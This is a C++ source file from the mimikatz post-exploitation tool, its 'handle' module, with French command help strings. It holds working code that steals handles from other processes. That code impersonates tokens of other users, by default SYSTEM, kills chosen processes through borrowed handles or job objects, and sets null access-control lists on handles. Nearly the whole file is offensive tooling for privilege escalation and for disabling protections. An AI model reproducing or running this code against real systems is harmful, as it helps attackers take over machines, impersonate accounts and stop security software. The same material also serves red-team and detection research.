/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "mod_mimikatz_handle.h"
#include "..\global.h"

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_handle::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(list,				L"list",				L"Affiche les handles du système (pour le moment juste les processus et tokens)"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(processStop,			L"processStop",			L"Essaye de stopper un ou plusieurs processus en utilisant d\'autres handles"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(tokenImpersonate,	L"tokenImpersonate",	L"Essaye d\'impersonaliser un token en utilisant d\'autres handles"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(nullAcl,				L"nullAcl",				L"Positionne une ACL null sur des Handles"));
	return monVector;
}

bool mod_mimikatz_handle::list(vector<wstring> * arguments)
{
	vector<mod_process::KIWI_PROCESSENTRY32> * mesProcess =  new vector<mod_process::KIWI_PROCESSENTRY32>();

	bool isProcessList = mod_process::getList(mesProcess);
	vector<SYSTEM_HANDLE> * mesHandles = new vector<SYSTEM_HANDLE>();

	DWORD id = (!arguments->empty() ? _wtoi(arguments->front().c_str()) : 0);

	if(mod_system::getSystemHandles(mesHandles, arguments->empty() ? NULL : &id))
	{
		for(vector<SYSTEM_HANDLE>::iterator monHandle = mesHandles->begin(); monHandle != mesHandles->end(); monHandle++)
		{
			HANDLE hProcess;
			if(hProcess = OpenProcess(PROCESS_DUP_HANDLE, false, monHandle->ProcessId))
			{
				HANDLE nouveauHandle;
				if(DuplicateHandle(hProcess, reinterpret_cast<HANDLE>(monHandle->Handle), GetCurrentProcess(), &nouveauHandle, 0, false, DUPLICATE_SAME_ACCESS))
				{
					wstring tokenType;
					if(mod_system::getHandleType(nouveauHandle, &tokenType))
					{
						bool isToken = (_wcsicmp(tokenType.c_str(), L"token") == 0);
						bool isProcess = (_wcsicmp(tokenType.c_str(), L"process") == 0);

						if(isToken || isProcess)
						{
							(*outputStream) << setw(5) << setfill(wchar_t(' ')) << monHandle->ProcessId << L"  ";

							if(isProcessList)
							{
								mod_process::KIWI_PROCESSENTRY32 * processHote = new mod_process::KIWI_PROCESSENTRY32();
								if(mod_process::getProcessEntryFromProcessId(monHandle->ProcessId, processHote, mesProcess))
									(*outputStream) << setw(25) << setfill(wchar_t(' ')) << left << processHote->szExeFile << right;
								delete processHote;
							}

							(*outputStream) << L" -> " << setw(5) << setfill(wchar_t(' ')) << monHandle->Handle << L'\t' << tokenType << L'\t';

							if(isToken)
							{
								wstring userName, domainName;
								if(mod_secacl::tokenUser(nouveauHandle, &userName, &domainName))
									(*outputStream) << L'\t' << domainName << L'\\' << userName ;
								else (*outputStream) << mod_system::getWinError();
							}
							else if(isProcess)
							{
								DWORD monPid = GetProcessId(nouveauHandle);
								(*outputStream) << monPid;

								if(isProcessList)
								{
									mod_process::KIWI_PROCESSENTRY32 * processKiwi = new mod_process::KIWI_PROCESSENTRY32();
									if(mod_process::getProcessEntryFromProcessId(monPid, processKiwi, mesProcess))
										(*outputStream) << L'\t' << processKiwi->szExeFile;
									delete processKiwi;
								}
							}
							(*outputStream) << endl;
						}
					}
					CloseHandle(nouveauHandle);
				}
				CloseHandle(hProcess);
			}
		}
	}
	else (*outputStream) << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;

	delete mesHandles;

	return true;
}

bool mod_mimikatz_handle::processStop(vector<wstring> * arguments)
{
	vector<mod_process::KIWI_PROCESSENTRY32> * mesProcess =  new vector<mod_process::KIWI_PROCESSENTRY32>();

	bool isProcessList = mod_process::getList(mesProcess);
	vector<SYSTEM_HANDLE> * mesHandles = new vector<SYSTEM_HANDLE>();

	if(mod_system::getSystemHandles(mesHandles))
	{
		for(vector<SYSTEM_HANDLE>::iterator monHandle = mesHandles->begin(); monHandle != mesHandles->end(); monHandle++)
		{
			HANDLE hProcess;
			if(hProcess = OpenProcess(PROCESS_DUP_HANDLE, false, monHandle->ProcessId))
			{
				HANDLE nouveauHandle;
				if(DuplicateHandle(hProcess, reinterpret_cast<HANDLE>(monHandle->Handle), GetCurrentProcess(), &nouveauHandle, 0, false, DUPLICATE_SAME_ACCESS))
				{
					wstring tokenType;
					if(mod_system::getHandleType(nouveauHandle, &tokenType))
					{
						if(_wcsicmp(tokenType.c_str(), L"process") == 0)
						{
							if(isProcessList)
							{
								mod_process::KIWI_PROCESSENTRY32 * processHote = new mod_process::KIWI_PROCESSENTRY32();
								mod_process::KIWI_PROCESSENTRY32 * processKiwi = new mod_process::KIWI_PROCESSENTRY32();
								DWORD monPid = GetProcessId(nouveauHandle);
								if(
									mod_process::getProcessEntryFromProcessId(monHandle->ProcessId, processHote, mesProcess) &&
									mod_process::getProcessEntryFromProcessId(monPid, processKiwi, mesProcess)
									)
								{

									for(vector<wstring>::iterator monProcessName = arguments->begin(); monProcessName != arguments->end(); monProcessName++)
									{
										if(_wcsicmp(processKiwi->szExeFile.c_str(), monProcessName->c_str()) == 0)
										{
											(*outputStream) <<
												setw(5) << setfill(wchar_t(' ')) << monHandle->ProcessId << L"  " <<
												setw(25) << setfill(wchar_t(' ')) << left << processHote->szExeFile << right << L" -> " <<
												setw(5) << setfill(wchar_t(' ')) << monHandle->Handle << L'\t' <<
												monPid << L'\t' << processKiwi->szExeFile << endl;
												;
											
												
											(*outputStream) << L"\tTerminate Process - ";	
											if(TerminateProcess(nouveauHandle, ERROR_SUCCESS) != 0)
											{
												(*outputStream) << L"OK";
											}
											else
											{
												(*outputStream) << L"KO ; " << mod_system::getWinError() << endl <<
												L"\tJob : "; 

												if(HANDLE monObject = CreateJobObject(NULL, NULL))
												{
													if(AssignProcessToJobObject(monObject, nouveauHandle))
													{
														(*outputStream) << L"TerminateJobObject - ";
														if(TerminateJobObject(monObject, ERROR_SUCCESS) != 0)
														{
															(*outputStream) << L"OK";
														}
														else (*outputStream) << L"KO ; " << mod_system::getWinError();
													}
													else (*outputStream) << L"AssignProcessToJobObject - KO ; " << mod_system::getWinError();
													CloseHandle(monObject);
												}

											}
											
											(*outputStream) << endl;
										}
									}
								}
								delete processKiwi;
								delete processHote;
							}
						}
					}
					CloseHandle(nouveauHandle);
				}
				CloseHandle(hProcess);
			}
		}
	}
	else (*outputStream) << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;

	delete mesHandles;

	return true;
}

bool mod_mimikatz_handle::tokenImpersonate(vector<wstring> * arguments)
{
	PNT_SET_INFORMATION_PROCESS NtSetInformationProcess = reinterpret_cast<PNT_SET_INFORMATION_PROCESS>(GetProcAddress(GetModuleHandle(L"ntdll"), "NtSetInformationProcess"));
	vector<mod_process::KIWI_PROCESSENTRY32> * mesProcess =  new vector<mod_process::KIWI_PROCESSENTRY32>();

	bool isProcessList = mod_process::getList(mesProcess);
	vector<SYSTEM_HANDLE> * mesHandles = new vector<SYSTEM_HANDLE>();

	if(mod_system::getSystemHandles(mesHandles))
	{
		for(vector<SYSTEM_HANDLE>::iterator monHandle = mesHandles->begin(); monHandle != mesHandles->end(); monHandle++)
		{
			HANDLE hProcess;
			if(hProcess = OpenProcess(PROCESS_DUP_HANDLE, false, monHandle->ProcessId))
			{
				HANDLE nouveauHandle;
				if(DuplicateHandle(hProcess, reinterpret_cast<HANDLE>(monHandle->Handle), GetCurrentProcess(), &nouveauHandle, 0, false, DUPLICATE_SAME_ACCESS))
				{
					wstring tokenType;
					if(mod_system::getHandleType(nouveauHandle, &tokenType))
					{
						if(_wcsicmp(tokenType.c_str(), L"token") == 0)
						{
							if(isProcessList)
							{
								mod_process::KIWI_PROCESSENTRY32 * processHote = new mod_process::KIWI_PROCESSENTRY32();
								if(
									mod_process::getProcessEntryFromProcessId(monHandle->ProcessId, processHote, mesProcess)
									)
								{
									wstring userName, domainName;
									if(mod_secacl::tokenUser(nouveauHandle, &userName, &domainName))
									{
										if(_wcsicmp(userName.c_str(), (arguments->empty() ? L"system" : arguments->front().c_str())) == 0)
										{
											(*outputStream) <<
												setw(5) << setfill(wchar_t(' ')) << monHandle->ProcessId << L"  " <<
												setw(25) << setfill(wchar_t(' ')) << left << processHote->szExeFile << right << L" -> " <<
												setw(5) << setfill(wchar_t(' ')) << monHandle->Handle << L'\t' <<
												domainName << L'\\' << userName << L'\t';

											if(mod_secacl::exchangeDupToken(&nouveauHandle))
											{
												if(ImpersonateLoggedOnUser(nouveauHandle))
												{
													(*outputStream) << L"ok !!" << endl;
													break;
												}
												else
												{
													(*outputStream) << L"ko - ImpersonateLoggedOnUser ; " << mod_system::getWinError() << endl;
												}
											}
											else
											{
												(*outputStream) << L"ko - mod_secacl::exchangeDupToken ; " << mod_system::getWinError() << endl;
											}

										}
									}
									else (*outputStream) << mod_system::getWinError();
								}
								delete processHote;
							}
						}
					}
					CloseHandle(nouveauHandle);
				}
				CloseHandle(hProcess);
			}
		}
	}
	else (*outputStream) << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;

	delete mesHandles;

	return true;
}

bool mod_mimikatz_handle::nullAcl(vector<wstring> * arguments)
{
	vector<SYSTEM_HANDLE> * mesHandles = new vector<SYSTEM_HANDLE>();
	if(mod_system::getSystemHandles(mesHandles))
	{
		for(vector<SYSTEM_HANDLE>::iterator monHandle = mesHandles->begin(); monHandle != mesHandles->end(); monHandle++)
		{
			HANDLE hProcess;
			if(hProcess = OpenProcess(PROCESS_DUP_HANDLE, false, monHandle->ProcessId))
			{
				HANDLE nouveauHandle;
				if(DuplicateHandle(hProcess, reinterpret_cast<HANDLE>(monHandle->Handle), GetCurrentProcess(), &nouveauHandle, 0, false, DUPLICATE_SAME_ACCESS))
				{
					wstring tokenType;
					if(mod_system::getHandleType(nouveauHandle, &tokenType))
					{
						bool toACL = true;;
						if(!arguments->empty())
							toACL = find(arguments->begin(), arguments->end(), tokenType) != arguments->end();
						
						if(toACL)
							(*outputStream) << monHandle->ProcessId << L'\t' << monHandle->Handle << L'\t' << tokenType << L"\t\t" << (mod_secacl::nullSdToHandle(&nouveauHandle) ? L"NULL !" : L"KO") << endl;
					}
					CloseHandle(nouveauHandle);
				}
				CloseHandle(hProcess);
			}
		}
	}
	else (*outputStream) << L"mod_system::getSystemHandles ; " << mod_system::getWinError() << endl;

	delete mesHandles;

	return true;
}
